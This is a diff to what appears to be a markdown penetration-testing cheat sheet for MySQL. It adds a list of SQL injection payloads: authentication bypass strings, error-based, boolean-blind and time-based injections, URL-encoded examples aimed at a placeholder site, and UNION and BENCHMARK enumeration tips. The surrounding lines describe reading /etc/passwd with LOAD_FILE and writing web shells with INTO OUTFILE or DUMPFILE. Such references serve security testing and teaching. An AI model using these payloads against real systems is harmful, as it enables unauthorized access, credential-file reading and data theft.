@@ -61,3 +61,45 @@ MySQL Server Instance
 - 📝 Check logs: `SHOW VARIABLES LIKE 'log_error';` then read it using `LOAD_FILE()`.
 - 🐚 File read/write via `SELECT LOAD_FILE('/etc/passwd');` and `INTO OUTFILE`.
 - 🔗 Use `SELECT ... INTO DUMPFILE` for potential code execution vectors (Web shells, etc.).
+
+
+---
+
+## 🎯 SQL Injection in MySQL
+
+### 🔍 Classic Auth Bypass
+```sql
+' OR '1'='1' --
+admin' -- 
+admin'/*
+```
+
+### 🧪 Error-Based
+```sql
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y) -- 
+```
+
+### 🕵️ Blind Boolean
+```sql
+' AND 1=1 -- (True)
+' AND 1=2 -- (False)
+```
+
+### ⏱️ Time-Based (Blind)
+```sql
+' AND SLEEP(5) --
+```
+
+### 🌐 URL-Encoded Examples
+```text
+https://target.com/product?id=1+AND+1=1--
+https://target.com/product?id=1'+AND+SLEEP(5)--+
+```
+
+---
+
+## 🔍 MySQL Injection Tips
+
+- Use `UNION SELECT NULL,...` to test column count and data retrieval.
+- Look for `information_schema.tables`, `information_schema.columns` for metadata.
+- Use `BENCHMARK(1000000,MD5('test'))` as a blind timing test.
